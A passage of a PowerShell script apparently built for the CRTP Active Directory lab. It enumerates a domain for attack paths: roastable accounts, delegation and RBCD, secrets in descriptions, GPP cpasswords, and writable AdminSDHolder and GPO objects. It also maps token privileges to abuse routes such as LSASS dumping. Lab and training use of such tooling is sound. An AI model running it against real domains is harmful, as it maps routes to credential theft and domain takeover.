<#
    Invoke-CRTPEnum.ps1
    ============================================================================
    One-shot Active Directory enumeration for the CRTP lab
    (dollarcorp.moneycorp.local and its trusts).

    GOAL
        Dump everything commonly misconfigured / vulnerable / directly
        exploitable into one timestamped folder so exam time goes to
        exploitation, not re-typing recon one-liners.

    DESIGN
        - ZERO dependencies: works with NOTHING but this .ps1 file.
          Everything falls back to raw System.DirectoryServices LDAP.
        - Optional bonuses (never required): RSAT AD module, the standalone
          Microsoft.ActiveDirectory.Management.dll (-ADModulePath), PowerView,
          PowerUp, PowerHuntShares, Invoke-SessionHunter -> deeper sections.
        - Read-only. It does not change AD, does not touch AMSI, does
          not run any offensive binary. It finds targets, then writes the
          exact exploitation command for each finding to EXPLOIT_COMMANDS.txt.

    USAGE
        . .\Invoke-CRTPEnum.ps1
        Invoke-CRTPEnum                                   # current domain
        Invoke-CRTPEnum -Domain dollarcorp.moneycorp.local
        Invoke-CRTPEnum -OutDir C:\Users\Public\loot
        Invoke-CRTPEnum -Quick                            # skip slow ACL/session sweeps
        Invoke-CRTPEnum -IncludeForest                    # also enum trusted domains
        Invoke-CRTPEnum -Target dcorp-appsrv              # scope host sections to one box (fast re-run per hop)
        Invoke-CRTPEnum -WinPEASPath C:\Tools\winPEASx64.exe  # opt-in deep local triage (LOUD)

    OUTPUT
        <OutDir>\CRTPEnum_<domain>_<timestamp>\
            00_SUMMARY.txt        <-- read first (ranked HIGH/MED/INFO + cheat)
            00_SUMMARY.html       <-- same, color-coded for the report
            EXPLOIT_COMMANDS.txt  <-- exact commands per finding, pre-filled
            00_context.txt ... 14_*.txt   per-section raw dumps
        <OutDir>\_MASTER_findings.txt   <-- HIGH+MED accumulated across all runs
    ============================================================================
#>

# Script-level params so the file works when run DIRECTLY:
#     .\Invoke-CRTPEnum.ps1 -Domain dollarcorp.moneycorp.local -OutDir C:\Users\Public\loot
# ...and still works when DOT-SOURCED (. .\Invoke-CRTPEnum.ps1) to just load the function.
[CmdletBinding()]
param(
    [string]$Domain,
    [string]$OutDir = "$PWD",
    [switch]$Quick,
    [switch]$IncludeForest,
    [string]$ADModulePath,
    [string[]]$Target,
    [string]$WinPEASPath,
    [switch]$SQLCrawl,
    [switch]$BloodHound,
    [string]$SharpHoundPath,
    [switch]$Roast,
    [string]$RubeusPath,
    [switch]$SharpEnum,
    [string]$ToolsDir = 'D:\CRTP\Tools\Sliver',
    [switch]$HostSweep,
    [pscredential]$Credential,  # enumerate AS a captured user (LDAP engine) without spawning a shell
    [string[]]$Only,            # run ONLY sections matching these keywords (e.g. users,acls,delegation)
    [string[]]$Skip,            # skip sections matching these keywords
    [switch]$Zip                # also zip the whole run folder (easy transfer / reporting)
)

function Invoke-CRTPEnum {
    [CmdletBinding()]
    param(
        [string]$Domain,
        [string]$OutDir = "$PWD",
        [switch]$Quick,
        [switch]$IncludeForest,
        [string]$ADModulePath,   # path to standalone Microsoft.ActiveDirectory.Management.dll (no RSAT needed)
        [string[]]$Target,       # scope host-centric sections (computers/shares/sessions) to these host(s)
        [string]$WinPEASPath,    # optional: run winPEAS from this path and save its output (loud - opt-in only)
        [switch]$SQLCrawl,       # optional: PowerUpSQL MSSQL discovery + link crawl (needs PowerUpSQL loaded)
        [switch]$BloodHound,     # optional: run SharpHound collection for BloodHound (opt-in)
        [string]$SharpHoundPath, # path to SharpHound.ps1 OR SharpHound.exe (used with -BloodHound)
        [switch]$Roast,          # optional: run Rubeus kerberoast + asreproast (opt-in; generates 4769 events)
        [string]$RubeusPath,     # path to Rubeus.exe (used with -Roast)
        [switch]$SharpEnum,      # optional: run compiled .NET ENUM binaries (ADCollector/Seatbelt/SharpUp) - louder
        [string]$ToolsDir = 'D:\CRTP\Tools\Sliver', # folder holding the compiled tools
        [switch]$HostSweep,      # enable host-touching sweeps (local-admin/shares/sessions) domain-wide (LOUD)
        [pscredential]$Credential, # enumerate AS a captured user (drives the built-in LDAP engine)
        [string[]]$Only,         # run ONLY sections whose keyword(s) match these
        [string[]]$Skip,         # skip sections whose keyword(s) match these
        [switch]$Zip             # also zip the run folder when done
    )

    $ErrorActionPreference = 'SilentlyContinue'
    $WarningPreference     = 'SilentlyContinue'

    # ---------------- setup / capability detection ----------------
    $useAD = $false
    # 1) already loaded?
    if (-not (Get-Command Get-ADDomain -ErrorAction SilentlyContinue)) {
        # 2) installed RSAT module
        if (Get-Module -ListAvailable -Name ActiveDirectory) {
            Import-Module ActiveDirectory -ErrorAction SilentlyContinue
        }
    }
    # 3) standalone AD module DLL (works without RSAT / without admin)
    if (-not (Get-Command Get-ADDomain -ErrorAction SilentlyContinue)) {
        $adDllCandidates = @()
        if ($ADModulePath) { $adDllCandidates += $ADModulePath }
        $adDllCandidates += @(
            (Join-Path $PSScriptRoot 'ADModule-master\Microsoft.ActiveDirectory.Management.dll'),
            (Join-Path $PSScriptRoot 'Microsoft.ActiveDirectory.Management.dll'),
            'D:\CRTP\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll'
        )
        foreach($dll in $adDllCandidates){
            if ($dll -and (Test-Path $dll)) {
                try { Import-Module $dll -ErrorAction Stop; break } catch {}
            }
        }
    }
    if (Get-Command Get-ADDomain -ErrorAction SilentlyContinue) { $useAD = $true }
    # When alternate creds are supplied, drive everything through the built-in LDAP
    # engine (which honors -Credential). AD-module/PowerView calls use the current
    # process token, so we force LDAP mode to keep the whole run in one identity.
    if ($Credential) { $useAD = $false }
    $havePV  = [bool](Get-Command Get-DomainUser         -ErrorAction SilentlyContinue)
    $havePVA = [bool](Get-Command Find-InterestingDomainAcl -ErrorAction SilentlyContinue)
    $havePVL = [bool](Get-Command Find-LocalAdminAccess  -ErrorAction SilentlyContinue)
    $havePVS = [bool](Get-Command Find-DomainShare       -ErrorAction SilentlyContinue)
    $haveHunt= [bool](Get-Command Invoke-HuntSMBShares   -ErrorAction SilentlyContinue)   # PowerHuntShares
    $havePU  = [bool](Get-Command Invoke-PrivescAudit    -ErrorAction SilentlyContinue)   # PowerUp
    $haveGPP = [bool](Get-Command Get-CachedGPPPassword  -ErrorAction SilentlyContinue)   # PowerUp
    $havePEC = [bool](Get-Command Invoke-PrivescCheck    -ErrorAction SilentlyContinue)   # PrivEscCheck
    $haveSH  = [bool](Get-Command Invoke-SessionHunter   -ErrorAction SilentlyContinue)   # Invoke-SessionHunter
    $havePVG = [bool](Get-Command Get-DomainGPOUserLocalGroupMapping -ErrorAction SilentlyContinue)  # PowerView
    $havePVF = [bool](Get-Command Get-DomainForeignGroupMember       -ErrorAction SilentlyContinue)  # PowerView
    $haveSQL = [bool](Get-Command Get-SQLInstanceDomain  -ErrorAction SilentlyContinue)   # PowerUpSQL
    $haveEDR = [bool](Get-Command Invoke-EDRChecker       -ErrorAction SilentlyContinue)  # Invoke-EDRChecker
    $haveWMIla = [bool](Get-Command Find-WMILocalAdminAccess       -ErrorAction SilentlyContinue)
    $havePSRla = [bool](Get-Command Find-PSRemotingLocalAdminAccess -ErrorAction SilentlyContinue)

    if (-not $Domain) {
        try   { $Domain = ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).Name }
        catch { $Domain = $env:USERDNSDOMAIN }
    }
    if (-not $Domain) { Write-Host "[-] Could not determine a domain. Pass -Domain." -ForegroundColor Red; return }

    $stamp = Get-Date -Format 'yyyyMMdd_HHmmss'
    $run   = Join-Path $OutDir ("CRTPEnum_{0}_{1}" -f ($Domain -replace '\.','_'), $stamp)
    New-Item -ItemType Directory -Path $run -Force | Out-Null
    $summary = New-Object System.Collections.Generic.List[string]
    $expl    = New-Object System.Collections.Generic.List[object]
    function AddExpl($type,$data){ $expl.Add([PSCustomObject]@{ Type=$type; Data=$data }) }

    # Host-touching sweeps (local-admin/shares/sessions) fan out to every computer = LOUD.
    # They run ONLY when you opt in with -HostSweep, or scope them with -Target.
    $doHostSweep = ($HostSweep -or $Target)

    # Facts the phase playbook pre-fills (captured during section 01)
    $g_domainSID=''; $g_parent=''; $g_forest=''; $g_dc=''

    function Log ($m,$c='Gray'){ Write-Host $m -ForegroundColor $c }
    function Sect($n){ Log "`n[==== $n ====]" 'Cyan' }
    function Flag($sev,$txt){
        $tag = switch($sev){ 'HIGH'{'[HIGH]'} 'MED'{'[MED ]'} default{'[INFO]'} }
        $summary.Add("$tag $txt")
        $col = switch($sev){ 'HIGH'{'Red'} 'MED'{'Yellow'} default{'DarkGray'} }
        Log "$tag $txt" $col
    }
    function Save($file,$data){ $data | Out-File -FilePath (Join-Path $run $file) -Encoding UTF8 -Width 4096 }

    # Section gate for -Only / -Skip. $keys = one or more keywords describing the section.
    # -Skip wins; if -Only is set, a section runs only if a keyword matches. Default: run all.
    function RunS([string[]]$keys){
        if ($Skip) { foreach($k in $keys){ foreach($s in $Skip){ if ($k -like "*$s*" -or $s -like "*$k*"){ return $false } } } }
        if ($Only) { foreach($k in $keys){ foreach($o in $Only){ if ($k -like "*$o*" -or $o -like "*$k*"){ return $true } } } ; return $false }
        return $true
    }

    # DirectoryEntry factory that honors -Credential (used everywhere we bind LDAP)
    function DE($path){
        if ($Credential) {
            New-Object System.DirectoryServices.DirectoryEntry($path, $Credential.UserName, $Credential.GetNetworkCredential().Password)
        } else {
            New-Object System.DirectoryServices.DirectoryEntry($path)
        }
    }

    # Root DSE-based defaults + reachability probe
    $adReachable = $false
    try {
        $rootDSE  = DE "LDAP://$Domain/RootDSE"
        $defaultNC = "$($rootDSE.defaultNamingContext)"
        $configNC  = "$($rootDSE.configurationNamingContext)"
        if ($defaultNC) { $adReachable = $true }
        else { $defaultNC = "DC=" + ($Domain -replace '\.',',DC='); $configNC = "CN=Configuration,$defaultNC" }
    } catch { $defaultNC = "DC=" + ($Domain -replace '\.',',DC='); $configNC = "CN=Configuration,$defaultNC" }

    function LDAP($filter,$props,$base){
        try {
            if (-not $base) { $base = "LDAP://$Domain" }
            $root = DE $base
            $ds   = New-Object System.DirectoryServices.DirectorySearcher($root)
            $ds.Filter   = $filter
            $ds.PageSize = 1000
            if ($props){ foreach($p in $props){ [void]$ds.PropertiesToLoad.Add($p) } }
            $ds.FindAll()
        } catch { @() }
    }
    function PV($r,$name){ $v = $r.Properties[$name]; if ($v){ if ($v.Count -gt 1){ $v -join '; ' } else { "$($v[0])" } } else { '' } }
    function IntP($r,$name){ $v = $r.Properties[$name]; if ($v -and $v.Count){ try { [int64]$v[0] } catch { 0 } } else { 0 } }
    # Interesting write rights on an object's DACL -> non-default principals (GPO/ACL abuse)
    function WriteAces($dn){
        $res = @()
        try {
            $ge = DE "LDAP://$dn"
            foreach($ace in $ge.ObjectSecurity.Access){
                if ($ace.AccessControlType -ne 'Allow'){ continue }
                $rights = "$($ace.ActiveDirectoryRights)"
                if ($rights -match 'WriteProperty|WriteDacl|WriteOwner|GenericWrite|GenericAll'){
                    $who = "$($ace.IdentityReference)"
                    if ($who -notmatch 'Domain Admins|Enterprise Admins|SYSTEM|BUILTIN\\Administrators|Creator Owner|Enterprise Domain Controllers|Domain Controllers'){
                        $res += [PSCustomObject]@{ Who=$who; Rights=$rights }
                    }
                }
            }
        } catch {}
        $res
    }

    Log "============================================================" 'White'
    Log " CRTP Enumeration   Domain: $Domain" 'White'
    Log " ADModule=$useAD  PowerView=$havePV  PowerUp=$havePU  Shares=$($havePVS -or $haveHunt)" 'White'
    if ($Target) { Log " Target scope: $($Target -join ', ')  (host-centric sections filtered)" 'Yellow' }
    $noise = if ($doHostSweep) { 'LOUD (host sweeps ON)' } else { 'QUIET (LDAP/local only; host sweeps OFF)' }
    Log " Noise posture: $noise" $(if($doHostSweep){'Yellow'}else{'Green'})
    if ($Credential) { Log " Enumerating AS: $($Credential.UserName)  (LDAP engine; host/module sections still use current token)" 'Yellow' }
    Log " Output=$run" 'White'
    if (-not $adReachable) {
        Log " [!] Could NOT reach a Domain Controller for '$Domain'." 'Red'
        Log "     If this is a website / DNS name (not an AD domain), the AD sections" 'Yellow'
        Log "     will be empty. Point -Domain at a real AD domain (e.g. the CRTP lab)." 'Yellow'
        Log "     Local checks (your token / privileges) still run below." 'Yellow'
    }
    Log "============================================================" 'White'

    # ---------------- 00 CURRENT CONTEXT (token / privileges / groups) ----------------
    if (RunS @('context','token')) {
    Sect "Current context (who am I, what can this token do)"
    $out = @()
    try {
        $id = [Security.Principal.WindowsIdentity]::GetCurrent()
        $out += "User : $($id.Name)"
        $out += "SID  : $($id.User.Value)"
        $isAdmin = (New-Object Security.Principal.WindowsPrincipal($id)).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
        $out += "Local admin (elevated) : $isAdmin"
        if ($isAdmin){ Flag 'INFO' "Current process is elevated (local admin on $env:COMPUTERNAME)." }

        # Token privileges worth abusing
        $privs = (whoami /priv) 2>$null
        $out += "`n--- PRIVILEGES ---`n" + ($privs | Out-String)
        $juicy = @{
            'SeImpersonatePrivilege' = 'HIGH|Potato attack (JuicyPotato/PrintSpoofer/GodPotato) -> SYSTEM'
            'SeAssignPrimaryToken'   = 'HIGH|Token abuse -> SYSTEM'
            'SeBackupPrivilege'      = 'HIGH|Read any file (SAM/SYSTEM/NTDS.dit) -> offline creds'
            'SeRestorePrivilege'     = 'HIGH|Write any file / registry -> privesc'
            'SeDebugPrivilege'       = 'HIGH|Dump LSASS of any process'
            'SeTakeOwnershipPrivilege'='MED|Take ownership of objects -> DACL abuse'
            'SeLoadDriverPrivilege'  = 'MED|Load malicious driver'
            'SeTcbPrivilege'         = 'HIGH|Act as part of the OS'
        }
        foreach($p in $juicy.Keys){
            $line = $privs | Where-Object { $_ -match $p -and $_ -match 'Enabled' }
            if ($line){ $sev,$msg = $juicy[$p] -split '\|',2; Flag $sev "Token priv $p ENABLED -> $msg"; AddExpl "Priv_$p" @{} }
        }

        # Interesting group memberships of the current token
        $groups = (whoami /groups) 2>$null
        $out += "`n--- GROUPS ---`n" + ($groups | Out-String)
        foreach($g in @('Domain Admins','Enterprise Admins','Administrators','DnsAdmins','Backup Operators','Server Operators','Account Operators')){
            if ($groups -match [regex]::Escape($g)){ Flag 'MED' "Current token is member of: $g" }
        }
    } catch { $out += "Error: $_" }
    Save '00_context.txt' $out
    }

    # ---------------- 00b EDR / AV awareness (Invoke-EDRChecker, local, read-only) ----------------
    if ($haveEDR -and (RunS @('edr','av'))) {
        Sect "Defensive products on this host (Invoke-EDRChecker)"
        $out = @()
        try {
            $edr = Invoke-EDRChecker 2>&1 | Out-String
            $out += $edr
            foreach($line in ($edr -split "`n" | Where-Object { $_ -match '^\[-\]' })){
                Flag 'INFO' "EDR/AV: $($line.Trim())"
            }
        } catch { $out += "Error: $_" }
        Save '00b_edr.txt' $out
    }

    # ---------------- 01 DOMAIN / FOREST / TRUSTS ----------------
    if (RunS @('domain','trust','forest')) {
    Sect "Domain, Forest & Trusts"
    $out = @()
    try {
        if ($useAD) {
            $dom = Get-ADDomain -Server $Domain
            try { $g_domainSID = $dom.DomainSID.Value; $g_parent = $dom.ParentDomain; $g_forest = (Get-ADForest -Server $Domain).RootDomain } catch {}
            try { $g_dc = (Get-ADDomainController -Filter * -Server $Domain | Select-Object -First 1).HostName } catch {}
            $out += ($dom | Format-List * | Out-String)
            $out += "`n--- FOREST ---`n" + (Get-ADForest -Server $Domain | Format-List * | Out-String)
            $out += "`n--- DOMAIN CONTROLLERS ---`n" + (
                Get-ADDomainController -Filter * -Server $Domain |
                Select-Object Name,IPv4Address,OperatingSystem,IsGlobalCatalog,IsReadOnly | Format-Table -Auto | Out-String)
            $out += "`n--- TRUSTS ---`n" + (
                Get-ADTrust -Filter * -Server $Domain |
                Select-Object Name,Direction,TrustType,IntraForest,ForestTransitive,SIDFilteringForestAware | Format-Table -Auto | Out-String)
            foreach($t in (Get-ADTrust -Filter * -Server $Domain)){
                $sev = if (-not $t.IntraForest) { 'MED' } else { 'INFO' }
                Flag $sev "Trust -> $($t.Name)  Dir=$($t.Direction)  IntraForest=$($t.IntraForest)  SIDFiltering=$($t.SIDFilteringForestAware)"
            }
        } else {
            try { $g_domainSID = (New-Object System.Security.Principal.SecurityIdentifier(((DE "LDAP://$defaultNC").Properties['objectSid'][0]),0)).Value } catch {}
            $d = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $out += ($d | Format-List * | Out-String)
            $out += "`n--- FOREST ---`n" + ($d.Forest | Format-List * | Out-String)
            $out += "`n--- TRUSTS ---`n" + ($d.GetAllTrustRelationships() | Format-List * | Out-String)
            foreach($t in $d.GetAllTrustRelationships()){ Flag 'MED' "Trust -> $($t.TargetName)  Dir=$($t.TrustDirection)" }
            foreach($t in $d.Forest.GetAllTrustRelationships()){ Flag 'MED' "Forest trust -> $($t.TargetName)  Dir=$($t.TrustDirection)" }
        }
    } catch { $out += "Error: $_" }
    Save '01_domain_trusts.txt' $out
    }

    # ---------------- 02 USERS + juicy attributes ----------------
    if (RunS @('users','kerberoast','asrep','delegation','secrets')) {
    Sect "Users (Kerberoast / AS-REP / no-preauth / desc secrets / delegation)"
    $out = @()
    try {
        if ($useAD) {
            $users = Get-ADUser -Filter * -Server $Domain -Properties `
                servicePrincipalName,description,info,memberOf,adminCount,userAccountControl,`
                pwdLastSet,lastLogonTimestamp,'msDS-AllowedToDelegateTo',trustedForDelegation,`
                doesNotRequirePreAuth,userPrincipalName,'msDS-AllowedToActOnBehalfOfOtherIdentity',`
                'msDS-SupportedEncryptionTypes',sIDHistory

            $out += ($users | Select-Object SamAccountName,Enabled,adminCount,description | Format-Table -Auto | Out-String)

            $kerb = $users | Where-Object { $_.servicePrincipalName }
            Save '02a_kerberoastable.txt' ($kerb | Select-Object SamAccountName,servicePrincipalName | Format-List | Out-String)
            foreach($u in $kerb){
                $et  = $u.'msDS-SupportedEncryptionTypes'
                $enc = if ((-not $et) -or ($et -band 0x4) -and -not ($et -band 0x18)) { 'RC4-easy' } elseif ($et -band 0x18) { 'AES' } else { 'RC4-easy' }
                $prio = if ($u.adminCount -eq 1) { ' [PRIVILEGED adminCount=1 - crack = instant DA]' } else { '' }
                Flag 'HIGH' "Kerberoastable $($u.SamAccountName)$prio  enc=$enc  SPN=$($u.servicePrincipalName -join ', ')"
                AddExpl 'Kerberoast' @{ User=$u.SamAccountName }
            }

            foreach($u in ($users | Where-Object { $_.doesNotRequirePreAuth })){ Flag 'HIGH' "AS-REP roastable (no pre-auth): $($u.SamAccountName)"; AddExpl 'ASREP' @{ User=$u.SamAccountName } }
            foreach($u in ($users | Where-Object { ($_.userAccountControl -band 0x20) })){ Flag 'MED' "PASSWD_NOTREQD set: $($u.SamAccountName)" }
            foreach($u in ($users | Where-Object { ($_.userAccountControl -band 0x10000) })){ Flag 'MED' "DONT_EXPIRE_PASSWORD: $($u.SamAccountName)" }
            foreach($u in ($users | Where-Object { $_.trustedForDelegation })){ Flag 'HIGH' "User trusted for UNCONSTRAINED delegation: $($u.SamAccountName)"; AddExpl 'UnconstrainedUser' @{ User=$u.SamAccountName } }
            foreach($u in ($users | Where-Object { $_.'msDS-AllowedToDelegateTo' })){ Flag 'HIGH' "Constrained delegation [$($u.SamAccountName)] -> $($u.'msDS-AllowedToDelegateTo' -join ', ')"; AddExpl 'ConstrainedUser' @{ User=$u.SamAccountName; SPN=($u.'msDS-AllowedToDelegateTo' -join ',') } }
            foreach($u in ($users | Where-Object { ($_.userAccountControl -band 0x1000000) })){ Flag 'HIGH' "Protocol transition (TrustedToAuthForDelegation) on user $($u.SamAccountName) - S4U2Self for ANY user, no ticket needed" }

            foreach($u in ($users | Where-Object { $_.description -and $_.description -match 'pass|pwd|cred|secret|pw\s*[:=]|:\s*\S' })){
                Flag 'HIGH' "Possible secret in description [$($u.SamAccountName)]: $($u.description)"
            }
            foreach($u in ($users | Where-Object { $_.info -and $_.info -match 'pass|pwd|cred|secret' })){
                Flag 'HIGH' "Possible secret in info/notes [$($u.SamAccountName)]: $($u.info)"
            }
            foreach($u in ($users | Where-Object { $_.sIDHistory -and $_.sIDHistory.Count })){
                Flag 'HIGH' "SID history on user $($u.SamAccountName): $($u.sIDHistory -join ', ') (cross-domain path or injected persistence)"
            }
            Save '02b_admincount.txt' (($users | Where-Object { $_.adminCount -eq 1 }) | Select-Object SamAccountName,memberOf | Format-List | Out-String)
        }
        elseif ($havePV) {
            $out += (Get-DomainUser -Domain $Domain | Select-Object samaccountname,description,serviceprincipalname | Format-Table -Auto | Out-String)
            foreach($u in (Get-DomainUser -SPN -Domain $Domain)){ Flag 'HIGH' "Kerberoastable user $($u.samaccountname)" }
            foreach($u in (Get-DomainUser -PreauthNotRequired -Domain $Domain)){ Flag 'HIGH' "AS-REP roastable: $($u.samaccountname)" }
        }
        else {
            foreach($r in (LDAP '(&(objectCategory=user)(servicePrincipalName=*))' @('samaccountname','serviceprincipalname'))){
                Flag 'HIGH' "Kerberoastable user $(PV $r 'samaccountname')  SPN=$(PV $r 'serviceprincipalname')"; AddExpl 'Kerberoast' @{ User=(PV $r 'samaccountname') }
            }
            foreach($r in (LDAP '(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' @('samaccountname'))){
                Flag 'HIGH' "AS-REP roastable: $(PV $r 'samaccountname')"; AddExpl 'ASREP' @{ User=(PV $r 'samaccountname') }
            }
            foreach($r in (LDAP '(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=524288))' @('samaccountname'))){
                Flag 'HIGH' "User trusted for UNCONSTRAINED delegation: $(PV $r 'samaccountname')"; AddExpl 'UnconstrainedUser' @{ User=(PV $r 'samaccountname') }
            }
            foreach($r in (LDAP '(&(objectCategory=user)(msDS-AllowedToDelegateTo=*))' @('samaccountname','msds-allowedtodelegateto'))){
                Flag 'HIGH' "Constrained delegation [$(PV $r 'samaccountname')] -> $(PV $r 'msds-allowedtodelegateto')"; AddExpl 'ConstrainedUser' @{ User=(PV $r 'samaccountname'); SPN=(PV $r 'msds-allowedtodelegateto') }
            }
            foreach($r in (LDAP '(&(objectCategory=user)(description=*))' @('samaccountname','description'))){
                $ds = PV $r 'description'; if ($ds -match 'pass|pwd|cred|secret'){ Flag 'HIGH' "Desc secret [$(PV $r 'samaccountname')]: $ds" }
            }
            foreach($r in (LDAP '(&(objectCategory=user)(sIDHistory=*))' @('samaccountname'))){
                Flag 'HIGH' "SID history on user $(PV $r 'samaccountname') (cross-domain path or injected persistence)"
            }
        }
    } catch { $out += "Error: $_" }
    Save '02_users.txt' $out
    }

    # ---------------- 03 COMPUTERS + delegation + OS + MAQ ----------------
    if (RunS @('computers','delegation','rbcd','maq')) {
    Sect "Computers (delegation, RBCD, legacy OS, LAPS)"
    $out = @()
    try {
        if ($useAD) {
            $comps = Get-ADComputer -Filter * -Server $Domain -Properties `
                OperatingSystem,trustedForDelegation,'msDS-AllowedToDelegateTo',`
                'msDS-AllowedToActOnBehalfOfOtherIdentity','ms-Mcs-AdmPwd',servicePrincipalName,userAccountControl
            if ($Target) { $comps = $comps | Where-Object { $c=$_; @($Target | Where-Object { $c.Name -like "*$_*" -or "$($c.DNSHostName)" -like "*$_*" }).Count -gt 0 } }
            $out += ($comps | Select-Object Name,OperatingSystem,trustedForDelegation | Format-Table -Auto | Out-String)

            foreach($c in ($comps | Where-Object { $_.trustedForDelegation })){ Flag 'HIGH' "UNCONSTRAINED delegation host (capture TGTs): $($c.Name)"; AddExpl 'UnconstrainedHost' @{ Host=$c.Name } }
            foreach($c in ($comps | Where-Object { $_.'msDS-AllowedToDelegateTo' })){ Flag 'HIGH' "Constrained delegation host [$($c.Name)] -> $($c.'msDS-AllowedToDelegateTo' -join ', ')"; AddExpl 'ConstrainedHost' @{ Host=$c.Name; SPN=($c.'msDS-AllowedToDelegateTo' -join ',') } }
            foreach($c in ($comps | Where-Object { ($_.userAccountControl -band 0x1000000) })){ Flag 'HIGH' "Protocol transition (TrustedToAuthForDelegation) on host $($c.Name) - S4U2Self for ANY user" }
            foreach($c in ($comps | Where-Object { $_.'msDS-AllowedToActOnBehalfOfOtherIdentity' })){ Flag 'HIGH' "RBCD configured on: $($c.Name) (msDS-AllowedToActOnBehalfOfOtherIdentity set)"; AddExpl 'RBCD' @{ Host=$c.Name } }
            foreach($c in ($comps | Where-Object { $_.OperatingSystem -match '2008|2003|Windows 7|Windows XP|Vista' })){ Flag 'MED' "Legacy OS: $($c.Name) [$($c.OperatingSystem)]" }
        } else {
            foreach($r in (LDAP '(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))' @('dnshostname'))){ Flag 'HIGH' "UNCONSTRAINED delegation host: $(PV $r 'dnshostname')" }
            foreach($r in (LDAP '(&(objectCategory=computer)(msDS-AllowedToDelegateTo=*))' @('dnshostname','msds-allowedtodelegateto'))){ Flag 'HIGH' "Constrained delegation host [$(PV $r 'dnshostname')] -> $(PV $r 'msds-allowedtodelegateto')" }
            foreach($r in (LDAP '(&(objectCategory=computer)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))' @('dnshostname'))){ Flag 'HIGH' "RBCD configured on: $(PV $r 'dnshostname')" }
            $out += (LDAP '(objectCategory=computer)' @('dnshostname','operatingsystem') | ForEach-Object { "$(PV $_ 'dnshostname')  [$(PV $_ 'operatingsystem')]" }) -join "`n"
        }
        # MachineAccountQuota
        try {
            $maq = (DE "LDAP://$defaultNC").Properties['ms-DS-MachineAccountQuota'][0]
            if ($null -ne $maq) {
                if ([int]$maq -gt 0) { Flag 'MED' "ms-DS-MachineAccountQuota = $maq (any user can add $maq computer objects -> RBCD / noPac primitive)"; AddExpl 'MAQ' @{ Quota=$maq } }
                else { Flag 'INFO' "ms-DS-MachineAccountQuota = 0 (cannot add computer objects)" }
            }
        } catch {}
    } catch { $out += "Error: $_" }
    Save '03_computers.txt' $out
    }

    # ---------------- 04 PRIVILEGED GROUPS ----------------
    if (RunS @('groups','privgroups')) {
    Sect "Privileged group membership"
    $out = @()
    try {
        $priv = 'Domain Admins','Enterprise Admins','Administrators','Schema Admins',
                'Account Operators','Backup Operators','Server Operators','Print Operators',
                'DnsAdmins','Group Policy Creator Owners','Cert Publishers','Protected Users'
        foreach($g in $priv){
            if ($useAD) {
                $m = Get-ADGroupMember -Identity $g -Recursive -Server $Domain 2>$null
                if ($m) {
                    $out += "`n### $g ###`n" + ($m | Select-Object Name,objectClass,SamAccountName | Format-Table -Auto | Out-String)
                    foreach($x in $m){ Flag 'INFO' "$g <- $($x.SamAccountName)" }
                }
            } else {
                foreach($r in (LDAP "(&(objectCategory=group)(cn=$g))" @('member'))){
                    foreach($mm in $r.Properties['member']){ Flag 'INFO' "$g <- $mm" }
                }
            }
        }
        Flag 'INFO' "DnsAdmins member -> arbitrary DLL load on DC (dnscmd /serverlevelplugindll) is a known DC escalation."

        # AdminSDHolder ACL - who can modify it = persistent DA (SDProp re-applies rights every 60 min)
        $out += "`n--- AdminSDHolder WRITE RIGHTS (non-default) ---"
        foreach($ace in (WriteAces "CN=AdminSDHolder,CN=System,$defaultNC")){
            Flag 'HIGH' "AdminSDHolder writable by $($ace.Who) ($($ace.Rights)) -> persistent Domain Admin (AD ACL backdoor)"
            $out += "AdminSDHolder  <-  $($ace.Who)  [$($ace.Rights)]"
        }
    } catch { $out += "Error: $_" }
    Save '04_priv_groups.txt' $out
    }

    # ---------------- 05 GPO ----------------
    if (RunS @('gpo','cpassword','sysvol')) {
    Sect "Group Policy Objects (+ SYSVOL cpassword hint)"
    $out = @()
    try {
        if (Get-Command Get-GPO -ErrorAction SilentlyContinue) {
            $out += (Get-GPO -All -Domain $Domain | Select-Object DisplayName,Id,GpoStatus,CreationTime | Format-Table -Auto | Out-String)
        } elseif ($useAD) {
            $out += (Get-ADObject -Filter 'objectClass -eq "groupPolicyContainer"' -Server $Domain -Properties displayName,gPCFileSysPath |
                     Select-Object displayName,gPCFileSysPath | Format-Table -Auto | Out-String)
        } else {
            $out += (LDAP '(objectClass=groupPolicyContainer)' @('displayname','gpcfilesyspath') | ForEach-Object { "$(PV $_ 'displayname')  ->  $(PV $_ 'gpcfilesyspath')" }) -join "`n"
        }
        # look for GPP cpassword in SYSVOL
        $sysvol = "\\$Domain\SYSVOL\$Domain\Policies"
        if (Test-Path $sysvol) {
            $xmls = Get-ChildItem -Path $sysvol -Recurse -Include 'Groups.xml','Services.xml','ScheduledTasks.xml','DataSources.xml','Printers.xml','Drives.xml' -ErrorAction SilentlyContinue
            foreach($x in $xmls){
                $c = Get-Content $x.FullName -ErrorAction SilentlyContinue
                if ($c -match 'cpassword'){ Flag 'HIGH' "GPP cpassword found (decryptable): $($x.FullName)"; AddExpl 'GPP' @{ File=$x.FullName } }
            }
        }
        Flag 'INFO' "Manually review \\$Domain\SYSVOL for scripts / cpassword / plaintext creds."

        # Who can EDIT each GPO (write rights = code exec on linked OUs/computers)
        $out += "`n--- GPO EDIT RIGHTS (non-default) ---"
        foreach($g in (LDAP '(objectClass=groupPolicyContainer)' @('displayname','distinguishedname'))){
            $gname = PV $g 'displayname'; $gdn = PV $g 'distinguishedname'
            foreach($ace in (WriteAces $gdn)){
                Flag 'MED' "GPO editable: '$gname' by $($ace.Who) ($($ace.Rights)) -> GPO abuse (New-GPOImmediateTask / edit)"
                $out += "$gname  <-  $($ace.Who)  [$($ace.Rights)]"
            }
        }
    } catch { $out += "Error: $_" }
    Save '05_gpo.txt' $out
    }

    # ---------------- 06 AD CS ----------------
    if (RunS @('adcs','certificate','esc')) {
    Sect "AD CS / Certificate Services (ESC hint)"
    $out = @()
    try {
        $caBase = "LDAP://CN=Enrollment Services,CN=Public Key Services,CN=Services,$configNC"
        $cas = LDAP '(objectClass=pKIEnrollmentService)' @('name','dNSHostName','certificateTemplates') $caBase
        if ($cas.Count -gt 0) {
            foreach($c in $cas){
